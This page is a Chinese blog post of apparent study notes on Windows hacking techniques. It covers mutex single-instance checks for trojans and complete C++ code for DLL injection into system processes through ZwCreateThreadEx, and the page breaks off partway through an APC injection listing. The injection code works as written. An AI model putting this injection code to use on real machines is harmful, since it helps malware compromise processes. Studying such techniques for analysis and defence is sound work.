<!DOCTYPE html><html lang="zh-CH" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Windows-Hack-Programming | The_Itach1</title><meta name="keywords" content="Windows,病毒,编程开发"><meta name="author" content="The_Itach1"><meta name="copyright" content="The_Itach1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="Windows-Hack-Programming本文章记录windows常见黑客编程技术，实际上都是比较老的了，新的也不可能发出来，之前也是分析恶意代码实践的lab，只能中ida的伪代码中学到一些知识点，比较零散，也没有参考代码，现在买了本《windows黑客编程技术基础》来系统学习学习。 关于vs的一些小操作主要是属性的设置。  字符集的设置。 优化 编译的exe能在其他电脑上打开https:&#x2F;">
<meta property="og:type" content="article">
<meta property="og:title" content="Windows-Hack-Programming">
<meta property="og:url" content="http://example.com/2022/01/31/Windows-Hack-Programming/index.html">
<meta property="og:site_name" content="The_Itach1">
<meta property="og:description" content="Windows-Hack-Programming本文章记录windows常见黑客编程技术，实际上都是比较老的了，新的也不可能发出来，之前也是分析恶意代码实践的lab，只能中ida的伪代码中学到一些知识点，比较零散，也没有参考代码，现在买了本《windows黑客编程技术基础》来系统学习学习。 关于vs的一些小操作主要是属性的设置。  字符集的设置。 优化 编译的exe能在其他电脑上打开https:&#x2F;">
<meta property="og:locale" content="zh_CH">
<meta property="og:image" content="https://s2.loli.net/2022/01/31/ktMQEOe8CgB9LJD.jpg">
<meta property="article:published_time" content="2022-01-31T09:38:45.000Z">
<meta property="article:modified_time" content="2022-06-18T09:10:09.411Z">
<meta property="article:author" content="The_Itach1">
<meta property="article:tag" content="Windows">
<meta property="article:tag" content="病毒">
<meta property="article:tag" content="编程开发">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.loli.net/2022/01/31/ktMQEOe8CgB9LJD.jpg"><link rel="shortcut icon" href="/img/2.png"><link rel="canonical" href="http://example.com/2022/01/31/Windows-Hack-Programming/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  ClickShowText: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-06-18 17:10:09'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
   if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }
  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }const asideStatus = saveToLocal.get('aside-status')
if (asideStatus !== undefined) {
   if (asideStatus === 'hide') {
     document.documentElement.classList.add('hide-aside')
   } else {
     document.documentElement.classList.remove('hide-aside')
   }
}})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/5.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">54</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">23</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> music</span></a></li><li><a class="site-page" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> Gallery</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> movies</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://s2.loli.net/2022/01/31/ktMQEOe8CgB9LJD.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">The_Itach1</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> List</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> music</span></a></li><li><a class="site-page" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> Gallery</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> movies</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">Windows-Hack-Programming</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-01-31T09:38:45.000Z" title="Created 2022-01-31 17:38:45">2022-01-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-06-18T09:10:09.411Z" title="Updated 2022-06-18 17:10:09">2022-06-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Reverse/">Reverse</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Windows-Hack-Programming"><a href="#Windows-Hack-Programming" class="headerlink" title="Windows-Hack-Programming"></a>Windows-Hack-Programming</h1><p>本文章记录windows常见黑客编程技术，实际上都是比较老的了，新的也不可能发出来，之前也是分析恶意代码实践的lab，只能中ida的伪代码中学到一些知识点，比较零散，也没有参考代码，现在买了本《windows黑客编程技术基础》来系统学习学习。</p>
<h2 id="关于vs的一些小操作"><a href="#关于vs的一些小操作" class="headerlink" title="关于vs的一些小操作"></a>关于vs的一些小操作</h2><p>主要是属性的设置。</p>
<ul>
<li>字符集的设置。</li>
<li>优化</li>
<li>编译的exe能在其他电脑上打开<a target="_blank" rel="noopener" href="https://blog.csdn.net/u014493318/article/details/60875012">https://blog.csdn.net/u014493318/article/details/60875012</a>，主要就是运行库的问题。</li>
<li>数据执行保护(DEP)</li>
<li>随机基地关闭</li>
<li>#pragma warning(disable:4996)，能直接使用strcmp等函数。</li>
</ul>
<p>查阅官方文档没有的函数<a target="_blank" rel="noopener" href="http://undoc.airesoft.co.uk/">http://undoc.airesoft.co.uk/</a></p>
<h2 id="第二章-基础技术"><a href="#第二章-基础技术" class="headerlink" title="第二章-基础技术"></a>第二章-基础技术</h2><h3 id="运行单一实例"><a href="#运行单一实例" class="headerlink" title="运行单一实例"></a>运行单一实例</h3><p>有时候，病毒木马为了被靶机激活，一般都会选择植入到靶机的多个位置等，但是多了就容易暴露，所以有没有方法可以实现同一时间只让一个进程执行我们的恶意代码呢。互斥对象就可以做到这个，当然方法也不唯一，启动进程参数也可以做到这点，比如说彩虹猫的两种main参数。</p>
<p>原理主要是利用CreateMutex的返回值特性完成的。</p>
<pre><code>返回值
如果函数成功，则返回值是新创建的互斥对象的句柄。

如果函数失败，则返回值为NULL。要获取扩展的错误信息，请调用GetLastError。

如果互斥锁是一个命名互斥锁并且该对象在此函数调用之前存在，则返回值是现有对象的句柄，并且GetLastError函数返回ERROR_ALREADY_EXISTS。</code></pre>
<p>互斥对象也在win32的学习中也学过的，下面直接上代码。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hMutex;</span><br><span class="line">	hMutex=CreateMutex(<span class="literal">NULL</span>, TRUE, <span class="string">L&quot;myMtex&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (hMutex)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (ERROR_ALREADY_EXISTS == GetLastError())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Already Run!&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Not Run!&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;CreateMutex Failed&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="DLL延迟加载"><a href="#DLL延迟加载" class="headerlink" title="DLL延迟加载"></a>DLL延迟加载</h3><p>设置下vs就可实现，属性-&gt;链接器-&gt;输入-&gt;延迟加载的DLL-&gt;输入:SkinPPWTL.dll</p>
<h3 id="资源释放"><a href="#资源释放" class="headerlink" title="资源释放"></a>资源释放</h3><p>就是把各种资源放到exe文件里面，这样程序可以就只有一个，但是可以包含很多其他文件，当然大小也会变大。在《恶代》一书中的lab3-3就有这样的技术。</p>
<p>自闭了，写出来一直findresource错误，但是生成的exe明明包含了这个资源。。</p>
<h2 id="第三章-注入技术"><a href="#第三章-注入技术" class="headerlink" title="第三章-注入技术"></a>第三章-注入技术</h2><p>dll注入的技术，已经总结了一篇文章，现在只写写当时没总结到的。</p>
<h3 id="突破SEESION-0-隔离的远线程注入"><a href="#突破SEESION-0-隔离的远线程注入" class="headerlink" title="突破SEESION 0 隔离的远线程注入"></a>突破SEESION 0 隔离的远线程注入</h3><p>这个也就是CreateRemoteThread的底层函数ZwCreateThreadEx，CreateRemoteThread的本质是调用ZwCreateThreadEx，也是很久前那些大师傅调试CreateRemoteThread函数，最后找到了为什么不能注入SEESION 0进程的原因，就是ZwCreateThreadEx的第七个参数CreateThreadFlags如果为1的话，就会造成注入失败，所以想要向系统进程注入dll文件，就必须设置这个参数为0。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//64位系统下</span></span><br><span class="line">    DWORD WINAPI ZwCreateThreadEx)(</span><br><span class="line">        PHANDLE ThreadHandle,</span><br><span class="line">        ACCESS_MASK DesiredAccess,</span><br><span class="line">        LPVOID ObjectAttributes,</span><br><span class="line">        HANDLE ProcessHandle,</span><br><span class="line">        LPTHREAD_START_ROUTINE lpStartAddress,</span><br><span class="line">        LPVOID lpParameter,</span><br><span class="line">        ULONG CreateThreadFlags,</span><br><span class="line">        SIZE_T ZeroBits,</span><br><span class="line">        SIZE_T StackSize,</span><br><span class="line">        SIZE_T MaximumStackSize,</span><br><span class="line">        LPVOID pUnkown</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line"><span class="comment">//32位系统下</span></span><br><span class="line">    DWORD WINAPI ZwCreateThreadEx)(</span><br><span class="line">        PHANDLE ThreadHandle,</span><br><span class="line">        ACCESS_MASK DesiredAccess,</span><br><span class="line">        LPVOID ObjectAttributes,</span><br><span class="line">        HANDLE ProcessHandle,</span><br><span class="line">        LPTHREAD_START_ROUTINE lpStartAddress,</span><br><span class="line">        LPVOID lpParameter,</span><br><span class="line">        BOOL CreateSuspended,</span><br><span class="line">        DWORD dwStackSize,</span><br><span class="line">        DWORD dw1,</span><br><span class="line">        DWORD dw2,</span><br><span class="line">        LPVOID pUnkown</span><br><span class="line">        );</span><br></pre></td></tr></table></figure>

<p>ZwCreateThreadEx和NtCreateThreadEx好像是一样的。用户模式下是一样的。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">MyInjectDll</span><span class="params">(DWORD dwPID, LPCSTR szDllPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* ZWCREATETHREADEX)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">        ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">        LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">        HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">        LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="function"><span class="params">        LPVOID lpParameter,</span></span></span><br><span class="line"><span class="function"><span class="params">        BOOL CreateSuspended,</span></span></span><br><span class="line"><span class="function"><span class="params">        DWORD dwStackSize,</span></span></span><br><span class="line"><span class="function"><span class="params">        DWORD dw1,</span></span></span><br><span class="line"><span class="function"><span class="params">        DWORD dw2,</span></span></span><br><span class="line"><span class="function"><span class="params">        LPVOID pUnkown</span></span></span><br><span class="line"><span class="function"><span class="params">        )</span></span>;</span><br><span class="line"></span><br><span class="line">	HANDLE hProcess = <span class="literal">NULL</span>, hThread = <span class="literal">NULL</span>;<span class="comment">//目标进程的句柄 </span></span><br><span class="line">    LPVOID pRemoteBuf = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwBufSize = (DWORD)<span class="built_in">strlen</span>(szDllPath) + <span class="number">1</span>;</span><br><span class="line">    HMODULE hMod = <span class="literal">NULL</span>;</span><br><span class="line">    HMODULE hNtdllDll = <span class="literal">NULL</span>;</span><br><span class="line">    LPTHREAD_START_ROUTINE pThreadProc;</span><br><span class="line">    ZWCREATETHREADEX MyZwCreateThreadEx;</span><br><span class="line">    DWORD bzwCT;</span><br><span class="line"></span><br><span class="line">    HANDLE hRemoteThread = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;OpenProcess failed!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//申请dll路径大小的空间</span></span><br><span class="line">    pRemoteBuf = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == pRemoteBuf)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;VirtualAllocEx failed!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//写入dll路径</span></span><br><span class="line">    <span class="keyword">if</span> (FALSE == WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory failed!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    hMod = GetModuleHandle(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    hNtdllDll = GetModuleHandleA(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"></span><br><span class="line">    MyZwCreateThreadEx = (ZWCREATETHREADEX)GetProcAddress(hNtdllDll, <span class="string">&quot;ZwCreateThreadEx&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pThreadProc == <span class="literal">NULL</span> || MyZwCreateThreadEx == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress failed!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    bzwCT=MyZwCreateThreadEx(&amp;hRemoteThread, PROCESS_ALL_ACCESS, <span class="literal">NULL</span>, hProcess, (LPTHREAD_START_ROUTINE)pThreadProc, pRemoteBuf, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hRemoteThread == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ZwCreateThreadEx failed!!! %d&quot;</span>,GetLastError());</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line">    FreeLibrary(hMod);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD dwPID = <span class="number">15644</span>;</span><br><span class="line">    LPCSTR szDllPath = <span class="string">&quot;d://myhack3.dll&quot;</span>;</span><br><span class="line">    MyInjectDll(dwPID, szDllPath);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实际上很多系统进程还是没法注入。</p>
<h3 id="APC注入"><a href="#APC注入" class="headerlink" title="APC注入"></a>APC注入</h3><p>新知识点，先了解APC的概念。</p>
<p>APC(Asynchronous Procedure)：异步过程调用，指函数在特定线程中被异步执行，看到这，我又产生了疑惑，什么是异步执行。</p>
<pre><code>同步：

所谓同步，就是发出一个功能调用时，在没有得到结果之前，该调用就不返回或继续执行后续操作。

简单来说，同步就是必须一件一件事做，等前一件做完了才能做下一件事。

例如：B/S模式中的表单提交，具体过程是：客户端提交请求-&gt;等待服务器处理-&gt;处理完毕返回，在这个过程中客户端（浏览器）不能做其他事。

异步：

异步与同步相对，当一个异步过程调用发出后，调用者在没有得到结果之前，就可以继续执行后续操作。当这个调用完成后，一般通过状态、通知和回调来通知调用者。对于异步调用，调用的返回并不受调用者控制。

对于通知调用者的三种方式，具体如下：

状态：即监听被调用者的状态（轮询），调用者需要每隔一定时间检查一次，效率会很低。
通知：当被调用者执行完成后，发出通知告知调用者，无需消耗太多性能。
回调：与通知类似，当被调用者执行完成后，会调用调用者提供的回调函数。
例如：B/S模式中的ajax请求，具体过程是：客户端发出ajax请求-&gt;服务端处理-&gt;处理完毕执行客户端回调，在客户端（浏览器）发出请求后，仍然可以做其他的事。</code></pre>
<p>每个线程都有一个APC队列，而QueueUserAPC函数可以可以向APC队列插入函数，先进先出，而且插入后，函数不会立即执行，除非函数处于通知(警告)状态，当线程在内部使用SignalObjectAndWait，SleepEx,WaitForSingleObjectEX，WaitForMultipleObjectsEX，等函数把自己挂起就处于了警告状态，就会执行APC队列里面的函数。</p>
<p>也是对APC有了个初步的了解，而QueueUserAPC这个函数更是有和CreateRemoteThread相似的特性。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">QueueUserAPC</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] PAPCFUNC  pfnAPC,  ;指向应用程序提供的 APC 函数的指针，该函数在指定线程执行可警报等待操作时调用。</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] HANDLE    hThread, ;线程的句柄。</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] ULONG_PTR dwData ;传入的参数</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>所以，我们可以将第一个参数设置为LoadLibraryA的函数指针，第三个参数设置为dll路径，就可以达到注入的目的，如果说CreateRemoteThread是在目标进程中创造了一个线程用LoadLibraryA(“dll路径”)，QueueUserAPC就是向进程的线程的APC队列插入了个待执行的函数。</p>
<p>为了提高注入成功率，将会对一个进程的所有线程的APC队列进行QueueUserAPC函数注入。</p>
<p>代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 